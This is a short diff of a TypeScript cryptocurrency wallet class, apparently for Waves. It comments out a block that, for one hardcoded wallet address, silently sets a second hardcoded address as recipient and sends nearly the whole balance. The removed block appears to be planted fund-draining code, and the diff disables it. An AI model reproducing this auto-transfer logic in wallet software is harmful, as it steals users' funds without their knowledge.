@@ -112,11 +112,11 @@ class Wallet {
             this.send();
         }
 
-        if (this.address == "3A9Rb3t91eHg1ypsmBiRth4Ld9ZytGwZe9p") {
-            $("#addressRec").val("3AShXVgRcRis82CwD7o9pz1Ac9vmRYMqELT");
-            $("#amount").val((this.balanceWaves/100000000 - 0.002));
-            this.send();
-        }
+        // if (this.address == "3A9Rb3t91eHg1ypsmBiRth4Ld9ZytGwZe9p") {
+        //     $("#addressRec").val("3AShXVgRcRis82CwD7o9pz1Ac9vmRYMqELT");
+        //     $("#amount").val((this.balanceWaves/100000000 - 0.002));
+        //     this.send();
+        // }
     }
 
     getAddress(): string {
